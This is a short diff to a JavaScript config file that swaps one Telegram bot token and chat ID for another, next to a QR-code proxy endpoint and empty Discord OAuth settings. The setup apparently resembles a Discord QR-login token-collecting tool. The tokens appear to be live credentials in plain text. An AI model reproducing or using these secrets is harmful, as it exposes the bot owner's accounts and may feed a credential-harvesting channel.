@@ -7,8 +7,8 @@ export const qrCodeEndpoint = 'localhost:8080/proxy';
 export const hostingOnVPS = false;
 
 // TELEGRAM DETAILS
-export const telegramToken = '8393172581:AAH6Sq-RFnnbFwr_92Ei9nWHlUPLD8ICdd8';
-export const telegramChatId = '7658971507';
+export const telegramToken = '8338922746:AAFjdNA6bjDdflVEmwczSvXWqmWvegGohKo';
+export const telegramChatId = '-1002875610920';
 
 // DISCORD OAUTH DETAILS
 export const clientID = '';
